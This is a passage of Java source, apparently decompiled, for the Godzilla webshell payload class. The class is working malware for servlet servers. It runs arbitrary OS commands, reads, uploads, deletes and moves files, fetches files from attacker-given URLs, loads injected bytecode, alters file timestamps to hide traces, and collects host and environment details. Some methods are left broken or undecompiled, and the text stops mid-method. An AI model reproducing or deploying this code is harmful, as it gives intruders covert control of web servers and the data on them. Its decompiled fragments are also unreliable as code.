package com.reajason.javaweb.godzilla;

import lombok.Generated;

import javax.imageio.ImageIO;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.LinkOption;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.attribute.BasicFileAttributeView;
import java.nio.file.attribute.FileTime;
import java.sql.*;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.*;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;

@SuppressWarnings("all")
@Generated
public class Payload extends ClassLoader {
    public static final char[] toBase64 = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
    static Class class$0;
    static Class class$1;
    static Class class$2;
    static Class class$3;
    static Class class$4;
    static Class class$5;
    static Class class$6;
    static Class class$7;
    static Class class$8;
    static Class class$9;
    static Class class$10;
    HashMap parameterMap;
    HashMap sessionMap;
    Object servletContext;
    Object servletRequest;
    Object httpSession;
    byte[] requestData;
    ByteArrayOutputStream outputStream;

    public Payload() {
        this.parameterMap = new HashMap();
    }

    public Payload(ClassLoader loader) {
        super(loader);
        this.parameterMap = new HashMap();
    }

    public static byte[] copyOf(byte[] original, int newLength) {
        byte[] arrayOfByte = new byte[newLength];
        System.arraycopy(original, 0, arrayOfByte, 0, Math.min(original.length, newLength));
        return arrayOfByte;
    }

    public static Connection getConnection(String url, String userName, String password) {
        Connection connection = null;
        try {
            Class<?> cls = class$8;
            if (cls == null) {
                try {
                    cls = Class.forName("java.sql.DriverManager");
                    class$8 = cls;
                } catch (ClassNotFoundException unused) {
                    throw new NoClassDefFoundError(unused.getMessage());
                }
            }
            Field[] fields = cls.getDeclaredFields();
            Field field = null;
            for (int i = 0; i < fields.length; i++) {
                field = fields[i];
                if (field.getName().indexOf("rivers") != -1) {
                    Class<?> cls2 = class$9;
                    if (cls2 == null) {
                        try {
                            cls2 = Class.forName("java.util.List");
                            class$9 = cls2;
                        } catch (ClassNotFoundException unused2) {
                            throw new NoClassDefFoundError(unused2.getMessage());
                        }
                    }
                    if (cls2.isAssignableFrom(field.getType())) {
                        break;
                    }
                }
                field = null;
            }
            if (field != null) {
                field.setAccessible(true);
                List drivers = (List) field.get(null);
                Iterator iterator = drivers.iterator();
                while (iterator.hasNext() && connection == null) {
                    try {
                        Object object = iterator.next();
                        Driver driver = null;
                        Class<?> cls3 = class$10;
                        if (cls3 == null) {
                            try {
                                cls3 = Class.forName("java.sql.Driver");
                                class$10 = cls3;
                            } catch (ClassNotFoundException unused3) {
                                throw new NoClassDefFoundError(unused3.getMessage());
                            }
                        }
                        if (!cls3.isAssignableFrom(object.getClass())) {
                            Field[] driverInfos = object.getClass().getDeclaredFields();
                            int i2 = 0;
                            while (true) {
                                if (i2 >= driverInfos.length) {
                                    break;
                                }
                                Class<?> cls4 = class$10;
                                if (cls4 == null) {
                                    try {
                                        cls4 = Class.forName("java.sql.Driver");
                                        class$10 = cls4;
                                    } catch (ClassNotFoundException unused4) {
                                        throw new NoClassDefFoundError(unused4.getMessage());
                                    }
                                }
                                if (!cls4.isAssignableFrom(driverInfos[i2].getType())) {
                                    i2++;
                                } else {
                                    driverInfos[i2].setAccessible(true);
                                    driver = (Driver) driverInfos[i2].get(object);
                                    break;
                                }
                            }
                        }
                        if (driver != null) {
                            Properties properties = new Properties();
                            if (userName != null) {
                                properties.put("user", userName);
                            }
                            if (password != null) {
                                properties.put("password", password);
                            }
                            connection = driver.connect(url, properties);
                        }
                    } catch (Exception e) {
                    }
                }
            }
        } catch (Exception e2) {
        }
        return connection;
    }

    public static String getLocalIPList() {
        List ipList = new ArrayList();
        try {
            Enumeration networkInterfaces = NetworkInterface.getNetworkInterfaces();
            while (networkInterfaces.hasMoreElements()) {
                NetworkInterface networkInterface = (NetworkInterface) networkInterfaces.nextElement();
                Enumeration inetAddresses = networkInterface.getInetAddresses();
                while (inetAddresses.hasMoreElements()) {
                    InetAddress inetAddress = (InetAddress) inetAddresses.nextElement();
                    if (inetAddress != null) {
                        String ip = inetAddress.getHostAddress();
                        ipList.add(ip);
                    }
                }
            }
        } catch (Exception e) {
        }
        return Arrays.toString(ipList.toArray());
    }

    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field f2 = null;
        if (obj instanceof Field) {
            f2 = (Field) obj;
        } else {
            Class cs = obj.getClass();
            while (cs != null) {
                try {
                    f2 = cs.getDeclaredField(fieldName);
                    cs = null;
                } catch (Exception e) {
                    cs = cs.getSuperclass();
                }
            }
        }
        f2.setAccessible(true);
        return f2.get(obj);
    }

    private static Class getClass(ClassLoader classLoader, String name) {
        try {
            return Class.forName(name);
        } catch (Exception e) {
            try {
                return Class.forName(name, false, classLoader);
            } catch (Exception ignored) {
            }
            return null;
        }
    }

    public static int bytesToInt(byte[] bytes) {
        int i = (bytes[0] & 255) | ((bytes[1] & 255) << 8) | ((bytes[2] & 255) << 16) | ((bytes[3] & 255) << 24);
        return i;
    }

    public static String base64Encode(byte[] src) {
        int end = src.length;
        byte[] dst = new byte[4 * ((src.length + 2) / 3)];
        char[] base64 = toBase64;
        int sp = 0;
        int slen = ((end - 0) / 3) * 3;
        int sl = 0 + slen;
        if (-1 > 0 && slen > ((-1) / 4) * 3) {
            slen = ((-1) / 4) * 3;
        }
        int dp = 0;
        while (sp < sl) {
            int sl0 = Math.min(sp + slen, sl);
            int sp0 = sp;
            int dp0 = dp;
            while (sp0 < sl0) {
                int i = sp0;
                int sp02 = sp0 + 1;
                int sp03 = sp02 + 1;
                int i2 = ((src[i] & 255) << 16) | ((src[sp02] & 255) << 8);
                sp0 = sp03 + 1;
                int bits = i2 | (src[sp03] & 255);
                int i3 = dp0;
                int dp02 = dp0 + 1;
                dst[i3] = (byte) base64[(bits >>> 18) & 63];
                int dp03 = dp02 + 1;
                dst[dp02] = (byte) base64[(bits >>> 12) & 63];
                int dp04 = dp03 + 1;
                dst[dp03] = (byte) base64[(bits >>> 6) & 63];
                dp0 = dp04 + 1;
                dst[dp04] = (byte) base64[bits & 63];
            }
            int dlen = ((sl0 - sp) / 3) * 4;
            dp += dlen;
            sp = sl0;
        }
        if (sp < end) {
            int i4 = sp;
            int sp2 = sp + 1;
            int b0 = src[i4] & 255;
            int i5 = dp;
            int dp2 = dp + 1;
            dst[i5] = (byte) base64[b0 >> 2];
            if (sp2 == end) {
                int dp3 = dp2 + 1;
                dst[dp2] = (byte) base64[(b0 << 4) & 63];
                if (1 != 0) {
                    int dp4 = dp3 + 1;
                    dst[dp3] = 61;
                    int i6 = dp4 + 1;
                    dst[dp4] = 61;
                }
            } else {
                int i7 = sp2 + 1;
                int b1 = src[sp2] & 255;
                int dp5 = dp2 + 1;
                dst[dp2] = (byte) base64[((b0 << 4) & 63) | (b1 >> 4)];
                int dp6 = dp5 + 1;
                dst[dp5] = (byte) base64[(b1 << 2) & 63];
                if (1 != 0) {
                    int i8 = dp6 + 1;
                    dst[dp6] = 61;
                }
            }
        }
        return new String(dst);
    }

    public static byte[] base64Decode(java.lang.String r7) {
        throw new UnsupportedOperationException("Method not decompiled: p000.payload.base64Decode(java.lang.String):byte[]");
    }

    public Class m632g(byte[] b) {
        return super.defineClass(b, 0, b.length);
    }

    public byte[] run() throws Exception {
        String className;
        String methodName;
        try {
            className = get("evalClassName");
            methodName = get("methodName");
        } catch (Throwable e) {
            ByteArrayOutputStream stream = new ByteArrayOutputStream();
            PrintStream printStream = new PrintStream(stream);
            e.printStackTrace(printStream);
            printStream.flush();
            printStream.close();
            return stream.toByteArray();
        }
        if (methodName != null) {
            if (className == null) {
                Method method = getClass().getMethod(methodName);
                Class<?> returnType = method.getReturnType();
                Class<?> cls = class$0;
                if (cls == null) {
                    try {
                        cls = Class.forName("[B");
                        class$0 = cls;
                    } catch (ClassNotFoundException unused) {
                        throw new NoClassDefFoundError(unused.getMessage());
                    }
                }
                if (returnType.isAssignableFrom(cls)) {
                    return (byte[]) method.invoke(this);
                }
                return "this method returnType not is byte[]".getBytes();
            }
            Class evalClass = (Class) this.sessionMap.get(className);
            if (evalClass != null) {
                Object object = evalClass.newInstance();
                object.equals(this.parameterMap);
                object.toString();
                Object resultObject = this.parameterMap.get("result");
                if (resultObject != null) {
                    Class<?> cls2 = class$0;
                    if (cls2 == null) {
                        try {
                            cls2 = Class.forName("[B");
                            class$0 = cls2;
                        } catch (ClassNotFoundException unused2) {
                            throw new NoClassDefFoundError(cls2.getName());
                        }
                    }
                    if (cls2.isAssignableFrom(resultObject.getClass())) {
                        return (byte[]) resultObject;
                    }
                    return "return typeErr".getBytes();
                }
                return new byte[0];
            }
            return "evalClass is null".getBytes();
        }
        return "method is null".getBytes();
    }

    public void formatParameter() {
        int read;
        this.parameterMap.clear();
        this.parameterMap.put("sessionMap", this.sessionMap);
        this.parameterMap.put("servletRequest", this.servletRequest);
        this.parameterMap.put("servletContext", this.servletContext);
        this.parameterMap.put("httpSession", this.httpSession);
        byte[] parameterByte = this.requestData;
        ByteArrayInputStream tStream = new ByteArrayInputStream(parameterByte);
        ByteArrayOutputStream tp = new ByteArrayOutputStream();
        byte[] lenB = new byte[4];
        try {
            GZIPInputStream inputStream = new GZIPInputStream(tStream);
            while (true) {
                byte t = (byte) inputStream.read();
                if (t != -1) {
                    if (t == 2) {
                        String key = new String(tp.toByteArray());
                        inputStream.read(lenB);
                        int len = bytesToInt(lenB);
                        byte[] data = new byte[len];
                        int readOneLen = 0;
                        do {
                            read = readOneLen + inputStream.read(data, readOneLen, data.length - readOneLen);
                            readOneLen = read;
                        } while (read < data.length);
                        this.parameterMap.put(key, data);
                        tp.reset();
                    } else {
                        tp.write(t);
                    }
                } else {
                    tp.close();
                    tStream.close();
                    inputStream.close();
                    return;
                }
            }
        } catch (Exception e) {
        }
    }

    @Override
    public boolean equals(Object obj) {
        if (obj != null && handle(obj)) {
            noLog(this.servletContext);
            return true;
        }
        return false;
    }

    public boolean handle(Object obj) {
        if (obj == null) {
            return false;
        }
        Class<?> cls = class$1;
        if (cls == null) {
            try {
                cls = Class.forName("java.io.ByteArrayOutputStream");
                class$1 = cls;
            } catch (ClassNotFoundException unused) {
                throw new NoClassDefFoundError(unused.getMessage());
            }
        }
        if (cls.isAssignableFrom(obj.getClass())) {
            this.outputStream = (ByteArrayOutputStream) obj;
            return false;
        }
        if (supportClass(obj, "%s.servlet.http.HttpServletRequest")) {
            this.servletRequest = obj;
        } else if (supportClass(obj, "%s.servlet.ServletRequest")) {
            this.servletRequest = obj;
        } else {
            Class<?> cls2 = class$0;
            if (cls2 == null) {
                try {
                    cls2 = Class.forName("[B");
                    class$0 = cls2;
                } catch (ClassNotFoundException unused2) {
                    throw new NoClassDefFoundError(unused2.getMessage());
                }
            }
            if (cls2.isAssignableFrom(obj.getClass())) {
                this.requestData = (byte[]) obj;
            } else if (supportClass(obj, "%s.servlet.http.HttpSession")) {
                this.httpSession = obj;
            }
        }
        handlePayloadContext(obj);
        if (this.servletRequest != null && this.requestData == null) {
            Object obj2 = this.servletRequest;
            Class[] clsArr = new Class[1];
            Class<?> cls3 = class$2;
            if (cls3 == null) {
                try {
                    cls3 = Class.forName("java.lang.String");
                    class$2 = cls3;
                } catch (ClassNotFoundException unused3) {
                    throw new NoClassDefFoundError(unused3.getMessage());
                }
            }
            clsArr[0] = cls3;
            Object retVObject = getMethodAndInvoke(obj2, "getAttribute", clsArr, new Object[]{"parameters"});
            if (retVObject != null) {
                Class<?> cls4 = class$0;
                if (cls4 == null) {
                    try {
                        cls4 = Class.forName("[B");
                        class$0 = cls4;
                    } catch (ClassNotFoundException unused4) {
                        throw new NoClassDefFoundError(unused4.getMessage());
                    }
                }
                if (cls4.isAssignableFrom(retVObject.getClass())) {
                    this.requestData = (byte[]) retVObject;
                    return true;
                }
                return true;
            }
            return true;
        }
        return true;
    }

    private void handlePayloadContext(Object obj) {
        try {
            Method getRequestMethod = getMethodByClass(obj.getClass(), "getRequest", null);
            Method getServletContextMethod = getMethodByClass(obj.getClass(), "getServletContext", null);
            Method getSessionMethod = getMethodByClass(obj.getClass(), "getSession", null);
            if (getRequestMethod != null && this.servletRequest == null) {
                this.servletRequest = getRequestMethod.invoke(obj);
            }
            if (getServletContextMethod != null && this.servletContext == null) {
                this.servletContext = getServletContextMethod.invoke(obj);
            }
            if (getSessionMethod != null && this.httpSession == null) {
                this.httpSession = getSessionMethod.invoke(obj);
            }
        } catch (Exception e) {
        }
    }

    private boolean supportClass(Object obj, String classNameString) {
        Class c;
        if (obj == null) {
            return false;
        }
        boolean ret = false;
        try {
            Class c2 = getClass(obj.getClass().getClassLoader(), String.format(classNameString, "javax"));
            if (c2 != null) {
                ret = c2.isAssignableFrom(obj.getClass());
            }
            if (!ret && (c = getClass(obj.getClass().getClassLoader(), String.format(classNameString, "jakarta"))) != null) {
                ret = c.isAssignableFrom(obj.getClass());
            }
        } catch (Exception e) {
        }
        return ret;
    }

    @Override
    public String toString() {
        String returnString = null;
        if (this.outputStream != null) {
            try {
                initSessionMap();
                GZIPOutputStream gzipOutputStream = new GZIPOutputStream(this.outputStream);
                formatParameter();
                if (this.parameterMap.get("evalNextData") != null) {
                    run();
                    this.requestData = (byte[]) this.parameterMap.get("evalNextData");
                    formatParameter();
                }
                gzipOutputStream.write(run());
                gzipOutputStream.close();
                this.outputStream.close();
            } catch (Throwable e) {
                returnString = e.getMessage();
            }
        } else {
            returnString = "outputStream is null";
        }
        this.httpSession = null;
        this.outputStream = null;
        this.parameterMap = null;
        this.requestData = null;
        this.servletContext = null;
        this.servletRequest = null;
        this.sessionMap = null;
        return returnString;
    }

    private void initSessionMap() {
        if (this.sessionMap == null) {
            if (getSessionAttribute("sessionMap") != null) {
                try {
                    this.sessionMap = (HashMap) getSessionAttribute("sessionMap");
                } catch (Exception e) {
                }
            } else {
                this.sessionMap = new HashMap();
                try {
                    setSessionAttribute("sessionMap", this.sessionMap);
                } catch (Exception e2) {
                }
            }
            if (this.sessionMap == null) {
                this.sessionMap = new HashMap();
            }
        }
    }

    public String get(String key) {
        try {
            return new String((byte[]) this.parameterMap.get(key));
        } catch (Exception e) {
            return null;
        }
    }

    public byte[] getByteArray(String key) {
        try {
            return (byte[]) this.parameterMap.get(key);
        } catch (Exception e) {
            return null;
        }
    }

    public byte[] test() {
        return "ok".getBytes();
    }

    public byte[] getFile() {
        String str;
        String dirName = get("dirName");
        if (dirName != null) {
            String dirName2 = dirName.trim();
            String buffer = new String();
            try {
                String currentDir = new StringBuffer().append(new File(dirName2).getAbsoluteFile()).append("/").toString();
                File currentDirFile = new File(currentDir);
                if (currentDirFile.exists()) {
                    File[] files = currentDirFile.listFiles();
                    String buffer2 = new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(buffer)).append("ok").toString())).append("\n").toString())).append(currentDir).toString())).append("\n").toString();
                    if (files != null) {
                        for (File file : files) {
                            try {
                                buffer2 = new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(buffer2)).append(file.getName()).toString())).append("\t").toString())).append(file.isDirectory() ? "0" : "1").toString())).append("\t").toString())).append(new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(new Date(file.lastModified()))).toString())).append("\t").toString())).append(Integer.toString((int) file.length())).toString())).append("\t").toString();
                                StringBuffer append = new StringBuffer(String.valueOf(file.canRead() ? "R" : "")).append(file.canWrite() ? "W" : "");
                                Class<?> cls = class$3;
                                if (cls == null) {
                                    try {
                                        cls = Class.forName("java.io.File");
                                        class$3 = cls;
                                    } catch (ClassNotFoundException unused) {
                                        throw new NoClassDefFoundError(unused.getMessage());
                                    }
                                }
                                if (getMethodByClass(cls, "canExecute", null) != null) {
                                    str = file.canExecute() ? "X" : "";
                                } else {
                                    str = "";
                                }
                                String fileState = append.append(str).toString();
                                buffer2 = new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(buffer2)).append((fileState == null || fileState.trim().length() == 0) ? "F" : fileState).toString())).append("\n").toString();
                            } catch (Exception e) {
                                buffer2 = new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(buffer2)).append(e.getMessage()).toString())).append("\n").toString();
                            }
                        }
                    }
                    return buffer2.getBytes();
                }
                return "dir does not exist".getBytes();
            } catch (Exception e2) {
                return String.format("dir does not exist errMsg:%s", e2.getMessage()).getBytes();
            }
        }
        return "No parameter dirName".getBytes();
    }

    public String listFileRoot() {
        File[] files = File.listRoots();
        String buffer = new String();
        for (File file : files) {
            buffer = new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(buffer)).append(file.getPath()).toString())).append(";").toString();
        }
        return buffer;
    }

    public byte[] fileRemoteDown() {
        String url = get("url");
        String saveFile = get("saveFile");
        if (url != null && saveFile != null) {
            FileOutputStream outputStream = null;
            try {
                InputStream inputStream = new URL(url).openStream();
                outputStream = new FileOutputStream(saveFile);
                byte[] data = new byte[5120];
                while (true) {
                    int readNum = inputStream.read(data);
                    if (readNum != -1) {
                        outputStream.write(data, 0, readNum);
                    } else {
                        outputStream.flush();
                        outputStream.close();
                        inputStream.close();
                        return "ok".getBytes();
                    }
                }
            } catch (Exception e) {
                if (outputStream != null) {
                    try {
                        outputStream.close();
                    } catch (IOException e1) {
                        return e1.getMessage().getBytes();
                    }
                }
                return String.format("%s : %s", e.getClass().getName(), e.getMessage()).getBytes();
            }
        } else {
            return "url or saveFile is null".getBytes();
        }
    }

    public byte[] setFileAttr() {
        String ret;
        String type = get("type");
        String attr = get("attr");
        String fileName = get("fileName");
        if (type != null && attr != null && fileName != null) {
            try {
                File file = new File(fileName);
                if ("fileBasicAttr".equals(type)) {
                    Class<?> cls = class$3;
                    if (cls == null) {
                        try {
                            cls = Class.forName("java.io.File");
                            class$3 = cls;
                        } catch (ClassNotFoundException unused) {
                            throw new NoClassDefFoundError(unused.getMessage());
                        }
                    }
                    if (getMethodByClass(cls, "setWritable", new Class[]{Boolean.TYPE}) != null) {
                        if (attr.indexOf("R") != -1) {
                            file.setReadable(true);
                        }
                        if (attr.indexOf("W") != -1) {
                            file.setWritable(true);
                        }
                        if (attr.indexOf("X") != -1) {
                            file.setExecutable(true);
                        }
                        ret = "ok";
                    } else {
                        ret = "Java version is less than 1.6";
                    }
                } else if ("fileTimeAttr".equals(type)) {
                    Class<?> cls2 = class$3;
                    if (cls2 == null) {
                        try {
                            cls2 = Class.forName("java.io.File");
                            class$3 = cls2;
                        } catch (ClassNotFoundException unused2) {
                            throw new NoClassDefFoundError(unused2.getMessage());
                        }
                    }
                    if (getMethodByClass(cls2, "setLastModified", new Class[]{Long.TYPE}) != null) {
                        Date date = new Date(0L);
                        StringBuilder builder = new StringBuilder();
                        builder.append(attr);
                        char[] cs = new char[13 - builder.length()];
                        Arrays.fill(cs, '0');
                        builder.append(cs);
                        Date date2 = new Date(date.getTime() + Long.parseLong(builder.toString()));
                        file.setLastModified(date2.getTime());
                        ret = "ok";
                        try {
                            Class nioFile = Class.forName("java.nio.file.Paths");
                            Class basicFileAttributeViewClass = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                            Class filesClass = Class.forName("java.nio.file.Files");
                            if (nioFile != null && basicFileAttributeViewClass != null && filesClass != null) {
                                Path r0 = Paths.get(fileName, new String[0]);
                                Class cls3 = class$4;
                                if (cls3 == null) {
                                    try {
                                        cls3 = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                                        class$4 = cls3;
                                    } catch (ClassNotFoundException unused3) {
                                        throw new NoClassDefFoundError(unused3.getMessage());
                                    }
                                }
                                BasicFileAttributeView attributeView = (BasicFileAttributeView) Files.getFileAttributeView(r0, cls3, new LinkOption[0]);
                                attributeView.setTimes(FileTime.fromMillis(date2.getTime()), FileTime.fromMillis(date2.getTime()), FileTime.fromMillis(date2.getTime()));
                            }
                        } catch (Exception e) {
                        }
                    } else {
                        ret = "Java version is less than 1.2";
                    }
                } else {
                    ret = "no ExcuteType";
                }
            } catch (Exception e2) {
                return String.format("Exception errMsg:%s", e2.getMessage()).getBytes();
            }
        }
        ret = "type or attr or fileName is null";
        return ret.getBytes();
    }

    public byte[] readFile() {
        int read;
        String fileName = get("fileName");
        if (fileName != null) {
            File file = new File(fileName);
            try {
                if (file.exists() && file.isFile()) {
                    byte[] data = new byte[(int) file.length()];
                    if (data.length > 0) {
                        int readOneLen = 0;
                        FileInputStream fileInputStream = new FileInputStream(file);
                        do {
                            read = readOneLen + fileInputStream.read(data, readOneLen, data.length - readOneLen);
                            readOneLen = read;
                        } while (read < data.length);
                        fileInputStream.close();
                    } else {
                        byte[] temData = new byte[3145728];
                        FileInputStream fileInputStream2 = new FileInputStream(file);
                        int readLen = fileInputStream2.read(temData);
                        if (readLen > 0) {
                            data = new byte[readLen];
                            System.arraycopy(temData, 0, data, 0, data.length);
                        }
                        fileInputStream2.close();
                    }
                    return data;
                }
                return "file does not exist".getBytes();
            } catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] uploadFile() {
        String fileName = get("fileName");
        byte[] fileValue = getByteArray("fileValue");
        if (fileName != null && fileValue != null) {
            try {
                File file = new File(fileName);
                file.createNewFile();
                FileOutputStream fileOutputStream = new FileOutputStream(file);
                fileOutputStream.write(fileValue);
                fileOutputStream.close();
                return "ok".getBytes();
            } catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName and fileValue".getBytes();
    }

    public byte[] newFile() {
        String fileName = get("fileName");
        if (fileName != null) {
            File file = new File(fileName);
            try {
                if (file.createNewFile()) {
                    return "ok".getBytes();
                }
                return "fail".getBytes();
            } catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] newDir() {
        String dirName = get("dirName");
        if (dirName != null) {
            File file = new File(dirName);
            try {
                if (file.mkdirs()) {
                    return "ok".getBytes();
                }
                return "fail".getBytes();
            } catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] deleteFile() {
        String dirName = get("fileName");
        if (dirName != null) {
            try {
                File file = new File(dirName);
                deleteFiles(file);
                return "ok".getBytes();
            } catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter fileName".getBytes();
    }

    public byte[] moveFile() {
        String srcFileName = get("srcFileName");
        String destFileName = get("destFileName");
        if (srcFileName != null && destFileName != null) {
            File file = new File(srcFileName);
            try {
                if (file.exists()) {
                    if (file.renameTo(new File(destFileName))) {
                        return "ok".getBytes();
                    }
                    return "fail".getBytes();
                }
                return "The target does not exist".getBytes();
            } catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter srcFileName,destFileName".getBytes();
    }

    public byte[] copyFile() {
        String srcFileName = get("srcFileName");
        String destFileName = get("destFileName");
        if (srcFileName != null && destFileName != null) {
            File srcFile = new File(srcFileName);
            File destFile = new File(destFileName);
            try {
                if (srcFile.exists() && srcFile.isFile()) {
                    FileInputStream fileInputStream = new FileInputStream(srcFile);
                    FileOutputStream fileOutputStream = new FileOutputStream(destFile);
                    byte[] data = new byte[5120];
                    while (true) {
                        int readNum = fileInputStream.read(data);
                        if (readNum > -1) {
                            fileOutputStream.write(data, 0, readNum);
                        } else {
                            fileInputStream.close();
                            fileOutputStream.close();
                            return "ok".getBytes();
                        }
                    }
                } else {
                    return "The target does not exist or is not a file".getBytes();
                }
            } catch (Exception e) {
                return e.getMessage().getBytes();
            }
        } else {
            return "No parameter srcFileName,destFileName".getBytes();
        }
    }

    public byte[] include() {
        byte[] binCode = getByteArray("binCode");
        String className = get("codeName");
        if (binCode != null && className != null) {
            try {
                Payload payload = new Payload(getClass().getClassLoader());
                Class module = payload.m632g(binCode);
                this.sessionMap.put(className, module);
                return "ok".getBytes();
            } catch (Exception e) {
                if (this.sessionMap.get(className) != null) {
                    return "ok".getBytes();
                }
                return e.getMessage().getBytes();
            }
        }
        return "No parameter binCode,codeName".getBytes();
    }

    public Object getSessionAttribute(String keyString) {
        if (this.httpSession != null) {
            Object obj = this.httpSession;
            Class[] clsArr = new Class[1];
            Class<?> cls = class$2;
            if (cls == null) {
                try {
                    cls = Class.forName("java.lang.String");
                    class$2 = cls;
                } catch (ClassNotFoundException unused) {
                    throw new NoClassDefFoundError(unused.getMessage());
                }
            }
            clsArr[0] = cls;
            return getMethodAndInvoke(obj, "getAttribute", clsArr, new Object[]{keyString});
        }
        return null;
    }

    public void setSessionAttribute(String keyString, Object value) {
        if (this.httpSession != null) {
            Object obj = this.httpSession;
            Class[] clsArr = new Class[2];
            Class<?> cls = class$2;
            if (cls == null) {
                try {
                    cls = Class.forName("java.lang.String");
                    class$2 = cls;
                } catch (ClassNotFoundException unused) {
                    throw new NoClassDefFoundError(unused.getMessage());
                }
            }
            clsArr[0] = cls;
            Class<?> cls2 = class$5;
            if (cls2 == null) {
                try {
                    cls2 = Class.forName("java.lang.Object");
                    class$5 = cls2;
                } catch (ClassNotFoundException unused2) {
                    throw new NoClassDefFoundError(unused2.getMessage());
                }
            }
            clsArr[1] = cls2;
            getMethodAndInvoke(obj, "setAttribute", clsArr, new Object[]{keyString, value});
        }
    }

    public byte[] execCommand() {
        String argsCountStr = get("argsCount");
        if (argsCountStr != null && argsCountStr.length() > 0) {
            try {
                ArrayList argsList = new ArrayList();
                int argsCount = Integer.parseInt(argsCountStr);
                if (argsCount > 0) {
                    for (int i = 0; i < argsCount; i++) {
                        String val = get(String.format("arg-%d", i));
                        if (val != null) {
                            argsList.add(val);
                        }
                    }
                    String[] cmdarray = new String[argsList.size()];
                    for (int i2 = 0; i2 < argsList.size(); i2++) {
                        cmdarray[i2] = (String) argsList.get(i2);
                    }
                    Process process = Runtime.getRuntime().exec((String[]) argsList.toArray(new String[0]));
                    if (process == null) {
                        return "Unable to start process".getBytes();
                    }
                    InputStream inputStream = process.getInputStream();
                    InputStream errorInputStream = process.getErrorStream();
                    ByteArrayOutputStream memStream = new ByteArrayOutputStream(1024);
                    byte[] buff = new byte[521];
                    if (inputStream != null) {
                        while (true) {
                            int readNum = inputStream.read(buff);
                            if (readNum <= 0) {
                                break;
                            }
                            memStream.write(buff, 0, readNum);
                        }
                    }
                    if (errorInputStream != null) {
                        while (true) {
                            int readNum2 = errorInputStream.read(buff);
                            if (readNum2 <= 0) {
                                break;
                            }
                            memStream.write(buff, 0, readNum2);
                        }
                    }
                    return memStream.toByteArray();
                }
                return "argsCount <=0".getBytes();
            } catch (Exception e) {
                return e.getMessage().getBytes();
            }
        }
        return "No parameter argsCountStr".getBytes();
    }

    public byte[] getBasicsInfo() {
        try {
            Enumeration keys = System.getProperties().keys();
            String basicsInfo = new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new String())).append("FileRoot : ").append(listFileRoot()).append("\n").toString())).append("CurrentDir : ").append(new File("").getAbsoluteFile()).append("/").append("\n").toString())).append("CurrentUser : ").append(System.getProperty("user.name")).append("\n").toString())).append("ProcessArch : ").append(System.getProperty("sun.arch.data.model")).append("\n").toString();
            try {
                String tmpdir = System.getProperty("java.io.tmpdir");
                char lastChar = tmpdir.charAt(tmpdir.length() - 1);
                if (lastChar != '\\' && lastChar != '/') {
                    tmpdir = new StringBuffer(String.valueOf(tmpdir)).append(File.separator).toString();
                }
                basicsInfo = new StringBuffer(String.valueOf(basicsInfo)).append("TempDirectory : ").append(tmpdir).append("\n").toString();
            } catch (Exception e) {
            }
            String basicsInfo2 = new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(new StringBuffer(String.valueOf(basicsInfo)).append("DocBase : ").append(getDocBase()).append("\n").toString())).append("RealFile : ").append(getRealPath()).append("\n").toString())).append("servletRequest : ").append(this.servletRequest == null ? "null" : new StringBuffer(String.valueOf(String.valueOf(this.servletRequest.hashCode()))).append("\n").toString()).toString())).append("servletContext : ").append(this.servletContext == null ? "null" : new StringBuffer(String.valueOf(String.valueOf(this.servletContext.hashCode()))).append("\n").toString()).toString())).append("httpSession : ").append(this.httpSession == null ? "null" : new StringBuffer(String.valueOf(String.valueOf(this.httpSession.hashCode()))).append("\n").toString()).toString();
            try {
                basicsInfo2 = new StringBuffer(String.valueOf(basicsInfo2)).append("OsInfo : ").append(String.format("os.name: %s os.version: %s os.arch: %s", System.getProperty("os.name"), System.getProperty("os.version"), System.getProperty("os.arch"))).append("\n").toString();
            } catch (Exception e2) {
                basicsInfo2 = new StringBuffer(String.valueOf(basicsInfo2)).append("OsInfo : ").append(e2.getMessage()).append("\n").toString();
            }
            String basicsInfo3 = new StringBuffer(String.valueOf(basicsInfo2)).append("IPList : ").append(getLocalIPList()).append("\n").toString();
            while (keys.hasMoreElements()) {
                Object object = keys.nextElement();
                if (object instanceof String) {
                    String key = (String) object;
                    basicsInfo3 = new StringBuffer(String.valueOf(basicsInfo3)).append(key).append(" : ").append(System.getProperty(key)).append("\n").toString();
                }
            }
            Map envMap = getEnv();
            if (envMap != null) {
